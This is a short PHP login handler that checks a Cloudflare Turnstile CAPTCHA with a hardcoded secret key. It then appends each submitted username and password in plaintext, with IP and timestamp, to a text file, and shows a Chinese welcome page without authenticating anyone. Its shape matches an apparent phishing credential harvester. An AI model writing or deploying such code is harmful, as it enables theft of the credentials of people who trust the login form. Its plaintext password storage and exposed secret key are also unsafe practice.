<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $token = $_POST['cf-turnstile-response'] ?? '';
    if (empty($token)) { die("No CAPTCHA token received."); }

    $secretKey = '0x4AAAAAABlI9GDcRjMEL_2HtynYPPX323Q';
    $remoteIp = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];

    $postData = http_build_query([
        'secret' => $secretKey,
        'response' => $token,
        'remoteip' => $remoteIp
    ]);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://challenges.cloudflare.com/turnstile/v0/siteverify");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    $response = curl_exec($ch);
    curl_close($ch);

    $verification = json_decode($response, true);
    if (!$verification['success']) { die("CAPTCHA failed."); }

    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['pswrd']);
    $ip = $remoteIp;
    $timestamp = date("Y-m-d H:i:s");

    $filePath = "/home/albert/logins.txt";
    file_put_contents($filePath, "[$timestamp][$ip] Username: $username, Password: $password\n", FILE_APPEND);
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <title>欢迎</title>
      <link rel="stylesheet" href="namer.css">
    </head>
    <body>
      <h1>欢迎, <?php echo $username; ?>!</h1>
      <script src="/chinese/login.js" defer></script>
    </body>
    </html>
    <?php
} else {
    echo "Invalid request.";
}
?>
